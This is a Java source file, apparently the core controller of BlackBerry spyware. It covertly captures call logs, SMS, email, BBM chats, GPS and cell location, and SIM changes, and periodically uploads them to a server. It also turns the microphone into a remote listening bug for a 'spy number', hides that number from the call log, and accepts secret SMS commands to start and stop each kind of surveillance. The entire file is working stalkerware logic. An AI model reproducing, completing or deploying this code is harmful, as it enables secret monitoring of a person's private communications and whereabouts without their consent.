package com.vvt.ctrl;

import net.rim.device.api.ui.UiApplication;
import com.vvt.bbm.BBMCapture;
import com.vvt.bug.BugEngine;
import com.vvt.bug.BugInfo;
import com.vvt.calllogc.CallLogCapture;
import com.vvt.calllogmon.FxCallLogNumberMonitor;
import com.vvt.cellinfoc.CellInfoCapture;
import com.vvt.db.FxEventDBListener;
import com.vvt.db.FxEventDatabase;
import com.vvt.emailc.EmailCapture;
import com.vvt.event.FxEventCentre;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSCapture;
import com.vvt.info.ApplicationInfo;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.PrefInfo;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefSystem;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceChangeListener;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.response.CmdResponse;
import com.vvt.prot.response.struct.SendEventCmdResponse;
import com.vvt.protmgr.SendEventManager;
import com.vvt.protmgr.PhoenixProtocolListener;
import com.vvt.rmtcmd.RmtCmdRegister;
import com.vvt.rmtcmd.SMSCmdChangeListener;
import com.vvt.rmtcmd.SMSCmdStore;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.RmtCmdType;
import com.vvt.rmtcmd.SMSCommandCode;
import com.vvt.sim.SIMChangeNotif;
import com.vvt.smsc.SMSCapture;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;

public class AppEngine implements PreferenceChangeListener, SMSCmdChangeListener, PhoenixProtocolListener, FxEventDBListener, FxTimerListener {
	
	private Preference pref = Global.getPreference();
	private FxEventDatabase db = Global.getFxEventDatabase();
	private SendEventManager eventSender = SendEventManager.getInstance();
	private SMSCmdStore cmdStore = Global.getSMSCmdStore();
	private RmtCmdRegister rmtCmdRegister = Global.getRmtCmdRegister();
	private FxCallLogNumberMonitor fxNumberRemover = Global.getFxCallLogNumberMonitor();
	private CallLogCapture callLogCapture = null;
	private CellInfoCapture cellInfoCapture = null;
	private BugEngine bugEngine = null;
	private SMSCapture smsCapture = null;
	private GPSCapture gpsCapture = null;
	private BBMCapture bbmCapture = null;
	private EmailCapture emailCapture = null;
	private SIMChangeNotif simChNotif = null;
	private FxEventCentre eventCentre = null;
	private FxTimer sendTimer = new FxTimer(this);
	private String spyNumber = "";
	private int timerIndexDefault = 0;
	private int maxEventIndexDefault = 0;
	
	public AppEngine(UiApplication uiApp) {
		// To create features.
		bugEngine = new BugEngine();
		callLogCapture = new CallLogCapture();
		cellInfoCapture = new CellInfoCapture(uiApp);
		smsCapture = new SMSCapture();
		gpsCapture = new GPSCapture();
		bbmCapture = new BBMCapture();
		emailCapture = new EmailCapture(uiApp);
		simChNotif = new SIMChangeNotif();
		eventCentre = new FxEventCentre();
		PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		timerIndexDefault = general.getSendTimeIndex();
		maxEventIndexDefault = general.getMaxEventIndex();
		sendTimer.setInterval(ApplicationInfo.TIME_VALUE[timerIndexDefault]);
	}

	public void start() {
		// To set event listener.
		callLogCapture.addFxEventListener(eventCentre);
		cellInfoCapture.addFxEventListener(eventCentre);
		smsCapture.addFxEventListener(eventCentre);
		gpsCapture.addFxEventListener(eventCentre);
		bbmCapture.addFxEventListener(eventCentre);
		emailCapture.addFxEventListener(eventCentre);
		simChNotif.addFxEventListener(eventCentre);
		cmdStore.addListener(this);
		db.addListener(this);
		eventSender.addListener(this);
		sendTimer.start();
		setNextSchedule();
		registerPreference();
		registerRmtCmd();
	}

	public void stop() {
		// To remove event listener.
		callLogCapture.removeFxEventListener(eventCentre);
		cellInfoCapture.removeFxEventListener(eventCentre);
		smsCapture.removeFxEventListener(eventCentre);
		gpsCapture.removeFxEventListener(eventCentre);
		bbmCapture.removeFxEventListener(eventCentre);
		emailCapture.removeFxEventListener(eventCentre);
		cmdStore.removeListener(this);
		db.removeListener(this);
		eventSender.removeListener(this);
		sendTimer.stop();
		deregisterPreference();
		deregisterRmtCmd();
	}
	
	private void setNextSchedule() {
		PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		long nextSchedule = System.currentTimeMillis() + ApplicationInfo.TIME_VALUE[general.getSendTimeIndex()] * 1000;
		general.setNextSchedule(nextSchedule);
		pref.commit(general);
	}
	
	private void registerPreference() {
		PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
		PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
		PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
		if (prefEvent.isSupported()) {
			pref.registerPreferenceChangeListener(PreferenceType.PREF_EVENT_INFO, this);
		}
		if (prefCell.isSupported()) {
			pref.registerPreferenceChangeListener(PreferenceType.PREF_CELL_INFO, this);
		}
		if (prefGPS.isSupported()) {
			pref.registerPreferenceChangeListener(PreferenceType.PREF_GPS, this);
		}
		if (prefMessenger.isSupported()) {
			pref.registerPreferenceChangeListener(PreferenceType.PREF_IM, this);
		}
		if (prefBug.isSupported()) {
			pref.registerPreferenceChangeListener(PreferenceType.PREF_BUG_INFO, this);
		}
		if (prefSystem.isSupported()) {
			pref.registerPreferenceChangeListener(PreferenceType.PREF_SYSTEM, this);
		}
		pref.registerPreferenceChangeListener(PreferenceType.PREF_GENERAL, this);
	}
	
	private void registerRmtCmd() {
		SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
		PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
		PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
		// SendLog Command
		RmtCmdLine sendLogCmdLine = new RmtCmdLine();
		String sendImmediate = new String("Send immediate: ");
		sendLogCmdLine.setMessage(sendImmediate);
		sendLogCmdLine.setCode(smsCmdCode.getSendLogNowCmd());
		sendLogCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// Diagnostics Command
		RmtCmdLine diagnosticsCmdLine = new RmtCmdLine();
		String sendDiagnostics = new String("Send diagnostics: ");
		diagnosticsCmdLine.setMessage(sendDiagnostics);
		diagnosticsCmdLine.setCode(smsCmdCode.getSendDiagnosticsCmd());
		diagnosticsCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// Deactivation Command
		RmtCmdLine deactivationCmdLine = new RmtCmdLine();
		String deactivation = new String("Send deactivation: ");
		deactivationCmdLine.setMessage(deactivation);
		deactivationCmdLine.setCode(smsCmdCode.getDeactivationCmd());
		deactivationCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// To add commands.
		rmtCmdRegister.registerCommands(deactivationCmdLine);
		rmtCmdRegister.registerCommands(sendLogCmdLine);
		rmtCmdRegister.registerCommands(diagnosticsCmdLine);
		if (prefEvent.isSupported()) {
			// Start Capture Command
			RmtCmdLine startCaptureCmdLine = new RmtCmdLine();
			String startCapture = new String("Start capture: ");
			startCaptureCmdLine.setMessage(startCapture);
			startCaptureCmdLine.setCode(smsCmdCode.getStartCaptureCmd());
			startCaptureCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Stop Capture Command
			RmtCmdLine stopCaptureCmdLine = new RmtCmdLine();
			String stopCapture = new String("Stop capture: ");
			stopCaptureCmdLine.setMessage(stopCapture);
			stopCaptureCmdLine.setCode(smsCmdCode.getStopCaptureCmd());
			stopCaptureCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// To add commands.
			rmtCmdRegister.registerCommands(startCaptureCmdLine);
			rmtCmdRegister.registerCommands(stopCaptureCmdLine);
		}
		if (prefSystem.isSupported()) {
			// Start SIM Command
			RmtCmdLine simCmdLine = new RmtCmdLine();
			String startSIM = new String("Start/Stop SIM: ");
			simCmdLine.setMessage(startSIM);
			simCmdLine.setCode(smsCmdCode.getSIMCmd());
			simCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// To add commands.
			rmtCmdRegister.registerCommands(simCmdLine);
		}
		if (prefGPS.isSupported()) {
			// Start GPS Command
			RmtCmdLine gpsCmdLine = new RmtCmdLine();
			String startGPS = new String("Start/Stop GPS: ");
			gpsCmdLine.setMessage(startGPS);
			gpsCmdLine.setCode(smsCmdCode.getGPSCmd());
			gpsCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// GPS on Demand Command
			RmtCmdLine gpsOnDemandCmdLine = new RmtCmdLine();
			String sendGPS = new String("Send GPS: ");
			gpsOnDemandCmdLine.setMessage(sendGPS);
			gpsOnDemandCmdLine.setCode(smsCmdCode.getGPSOnDemandCmd());
			gpsOnDemandCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// To add commands.
			rmtCmdRegister.registerCommands(gpsCmdLine);
			rmtCmdRegister.registerCommands(gpsOnDemandCmdLine);
		}
		if (prefBug.isSupported()) {
			// Start Microphone Command
			RmtCmdLine startMicCmdLine = new RmtCmdLine();
			String startMic = new String("Start microphone: ");
			startMicCmdLine.setMessage(startMic);
			startMicCmdLine.setCode(smsCmdCode.getStartMicCmd());
			startMicCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Stop Microphone Command
			RmtCmdLine stopMicCmdLine = new RmtCmdLine();
			String stopMic = new String("Stop microphone: ");
			stopMicCmdLine.setMessage(stopMic);
			stopMicCmdLine.setCode(smsCmdCode.getStopMicCmd());
			stopMicCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// To add commands.
			rmtCmdRegister.registerCommands(startMicCmdLine);
			rmtCmdRegister.registerCommands(stopMicCmdLine);
			if (prefBug.isConferenceSupported()) {
				// Enable Watch List Command
				RmtCmdLine watchListCmdLine = new RmtCmdLine();
				String enableWatchList = new String("Start/Stop watchlist: ");
				watchListCmdLine.setMessage(enableWatchList);
				watchListCmdLine.setCode(smsCmdCode.getWatchListCmd());
				watchListCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// To add commands.
				rmtCmdRegister.registerCommands(watchListCmdLine);
			}
		}
		if (prefMessenger.isSupported()) {
			// Start BBM Command
			RmtCmdLine bbmCmdLine = new RmtCmdLine();
			String startGPS = new String("Start/Stop BBM: ");
			bbmCmdLine.setMessage(startGPS);
			bbmCmdLine.setCode(smsCmdCode.getBBMCmd());
			bbmCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// To add commands.
			rmtCmdRegister.registerCommands(bbmCmdLine);
		}
	}
	
	private void deregisterPreference() {
		PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
		PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
		PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
		if (prefEvent.isSupported()) {
			pref.removePreferenceChangeListener(PreferenceType.PREF_EVENT_INFO, this);
		}
		if (prefCell.isSupported()) {
			pref.removePreferenceChangeListener(PreferenceType.PREF_CELL_INFO, this);
		}
		if (prefGPS.isSupported()) {
			pref.removePreferenceChangeListener(PreferenceType.PREF_GPS, this);
		}
		if (prefMessenger.isSupported()) {
			pref.removePreferenceChangeListener(PreferenceType.PREF_IM, this);
		}
		if (prefBug.isSupported()) {
			pref.removePreferenceChangeListener(PreferenceType.PREF_BUG_INFO, this);
		}
		if (prefSystem.isSupported()) {
			pref.removePreferenceChangeListener(PreferenceType.PREF_SYSTEM, this);
		}
		pref.removePreferenceChangeListener(PreferenceType.PREF_GENERAL, this);
	}
	
	private void deregisterRmtCmd() {
		SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
		PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
		PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
		PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		if (prefEvent.isSupported()) {
			// Start Capture Command
			RmtCmdLine startCaptureCmdLine = new RmtCmdLine();
			startCaptureCmdLine.setCode(smsCmdCode.getStartCaptureCmd());
			startCaptureCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Stop Capture Command
			RmtCmdLine stopCaptureCmdLine = new RmtCmdLine();
			stopCaptureCmdLine.setCode(smsCmdCode.getStopCaptureCmd());
			stopCaptureCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// To add commands.
			rmtCmdRegister.deregisterCommands(startCaptureCmdLine);
			rmtCmdRegister.deregisterCommands(stopCaptureCmdLine);
		}
		// Diagnostics Command
		RmtCmdLine diagnosticsCmdLine = new RmtCmdLine();
		diagnosticsCmdLine.setCode(smsCmdCode.getSendDiagnosticsCmd());
		diagnosticsCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// SendLog Command
		RmtCmdLine sendLogCmdLine = new RmtCmdLine();
		sendLogCmdLine.setCode(smsCmdCode.getSendLogNowCmd());
		sendLogCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// Deactivation Command
		RmtCmdLine deactivationCmdLine = new RmtCmdLine();
		deactivationCmdLine.setCode(smsCmdCode.getDeactivationCmd());
		deactivationCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// To add commands.
		rmtCmdRegister.deregisterCommands(diagnosticsCmdLine);
		rmtCmdRegister.deregisterCommands(sendLogCmdLine);
		rmtCmdRegister.deregisterCommands(deactivationCmdLine);
		if (prefGPS.isSupported()) {
			// Start GPS Command
			RmtCmdLine gpsCmdLine = new RmtCmdLine();
			gpsCmdLine.setCode(smsCmdCode.getGPSCmd());
			gpsCmdLine.setRmtCmdType(RmtCmdType.SMS);
			RmtCmdLine gpsOnDemandCmdLine = new RmtCmdLine();
			gpsOnDemandCmdLine.setCode(smsCmdCode.getGPSOnDemandCmd());
			gpsOnDemandCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// To add commands.
			rmtCmdRegister.deregisterCommands(gpsCmdLine);
			rmtCmdRegister.deregisterCommands(gpsOnDemandCmdLine);
		}
		if (prefSystem.isSupported()) {
			// Start SIM Command
			RmtCmdLine simCmdLine = new RmtCmdLine();
			simCmdLine.setCode(smsCmdCode.getSIMCmd());
			simCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// To add commands.
			rmtCmdRegister.deregisterCommands(simCmdLine);
		}
		if (prefBug.isSupported()) {
			// Start Microphone Command
			RmtCmdLine startMicCmdLine = new RmtCmdLine();
			startMicCmdLine.setCode(smsCmdCode.getStartMicCmd());
			startMicCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Stop Microphone Command
			RmtCmdLine stopMicCmdLine = new RmtCmdLine();
			stopMicCmdLine.setCode(smsCmdCode.getStopMicCmd());
			stopMicCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// To add commands.
			rmtCmdRegister.deregisterCommands(startMicCmdLine);
			rmtCmdRegister.deregisterCommands(stopMicCmdLine);
			if (prefBug.isConferenceSupported()) {
				// Enable Watch List Command
				RmtCmdLine watchListCmdLine = new RmtCmdLine();
				watchListCmdLine.setCode(smsCmdCode.getWatchListCmd());
				watchListCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// To add commands.
				rmtCmdRegister.deregisterCommands(watchListCmdLine);
			}
		}
		if (prefMessenger.isSupported()) {
			// Start BBM Command
			RmtCmdLine bbmCmdLine = new RmtCmdLine();
			bbmCmdLine.setCode(smsCmdCode.getBBMCmd());
			bbmCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// To add commands.
			rmtCmdRegister.deregisterCommands(bbmCmdLine);
		}
	}
	
	private void handleEvents() {
		PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		int maxEvent = ApplicationInfo.EVENT_VALUE[general.getMaxEventIndex()];
		int events = db.getNumberOfEvent();
		if (events >= maxEvent) {
			eventSender.sendEvents();
		}
	}
	
	// PreferenceChangeListener
	public void preferenceChanged(PrefInfo prefInfo) {
		int prefId = prefInfo.getPrefType().getId();
		if (prefId == PreferenceType.PREF_EVENT_INFO.getId()) {
			PrefEventInfo eventInfo = (PrefEventInfo)prefInfo;
			// CallLog
			if (eventInfo.isCallLogEnabled()) {
				callLogCapture.startCapture();
			} else {
				callLogCapture.stopCapture();
			}
			// SMS
			if (eventInfo.isSMSEnabled()) {
				smsCapture.startCapture();
			} else {
				smsCapture.stopCapture();
			}
			// Email
			if (eventInfo.isEmailEnabled()) {
				emailCapture.startCapture();
			} else {
				emailCapture.stopCapture();
			}
		} else if (prefId == PreferenceType.PREF_BUG_INFO.getId()) {
			PrefBugInfo prefBug = (PrefBugInfo)prefInfo;
			BugInfo bugInfo = new BugInfo();
			bugInfo.setConferenceEnabled(prefBug.isConferenceSupported());
			bugInfo.setEnabled(prefBug.isEnabled());
			fxNumberRemover.removeCallLogNumber(spyNumber);
			spyNumber = prefBug.getMonitorNumber();
			bugInfo.setMonitorNumber(spyNumber);
			fxNumberRemover.addCallLogNumber(spyNumber);
			bugInfo.setWatchListEnabled(prefBug.isWatchAllEnabled());
			bugEngine.stop();
			bugEngine.setBugInfo(bugInfo);
			bugEngine.start();
		} else if (prefId == PreferenceType.PREF_CELL_INFO.getId()) {
			// To set event listener.
			PrefCellInfo cellInfo = (PrefCellInfo)prefInfo;
			cellInfoCapture.setInterval(cellInfo.getInterval());
			cellInfoCapture.stopCapture();
			if (cellInfo.isEnabled()) {
				cellInfoCapture.startCapture();
			}
		} else if (prefId == PreferenceType.PREF_GPS.getId()) {
			PrefGPS gps = (PrefGPS)prefInfo;
			gpsCapture.setGPSOption(gps.getGpsOption());
			gpsCapture.stopCapture();
			if (gps.isEnabled()) {
				gpsCapture.startCapture();
			}
		} else if (prefId == PreferenceType.PREF_IM.getId()) {
			PrefMessenger messenger = (PrefMessenger)prefInfo;
			// BBM
			if (messenger.isBBMEnabled()) {
				bbmCapture.startCapture();
			} else {
				bbmCapture.stopCapture();
			}
		} else if (prefId == PreferenceType.PREF_GENERAL.getId()) {
			PrefGeneral general = (PrefGeneral)prefInfo;
			int timerIndexChanged = general.getSendTimeIndex();
			int maxEventIndexChanged = general.getMaxEventIndex();
			if (timerIndexDefault != timerIndexChanged) {
				timerIndexDefault = timerIndexChanged;
				sendTimer.stop();
				sendTimer.setInterval(ApplicationInfo.TIME_VALUE[timerIndexChanged]);
				sendTimer.start();
			}
			if (maxEventIndexDefault != maxEventIndexChanged) {
				maxEventIndexDefault = maxEventIndexChanged;
				handleEvents();
			}
		} else if (prefId == PreferenceType.PREF_SYSTEM.getId()) {
			PrefSystem system = (PrefSystem)prefInfo;
			// SIM Change
			if (system.isSIMChangeEnabled()) {
				simChNotif.startCapture();
			} else {
				simChNotif.stopCapture();
			}
		}
	}

	// SMSCmdChangeListener
	public void smsCmdChanged() {
		rmtCmdRegister.deregisterAllCommands();
		registerRmtCmd();
	}

	// PhoenixProtocolListener
	public void onError(String message) {
		Log.error("AppEngine.onError", "message: " + message);
	}

	public void onSuccess(CmdResponse response) {
		sendTimer.stop();
		PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		if (response instanceof SendEventCmdResponse) {
			SendEventCmdResponse sendEventRes = (SendEventCmdResponse)response;
			general.setConnectionMethod(sendEventRes.getConnectionMethod());
			long currentTime = System.currentTimeMillis();
			general.setLastConnection(currentTime);
			long nextSchedule = currentTime + ApplicationInfo.TIME_VALUE[general.getSendTimeIndex()] * 1000;
			general.setNextSchedule(nextSchedule);
			pref.commit(general);
		}
		sendTimer.start();
	}

	// FxEventDBListener
	public void onDeleteError() {
	}

	public void onDeleteSuccess() {
	}

	public void onInsertError() {
	}

	public void onInsertSuccess() {
		handleEvents();
	}

	// FxTimerListener
	public void timerExpired(int id) {
		handleEvents();
	}
}
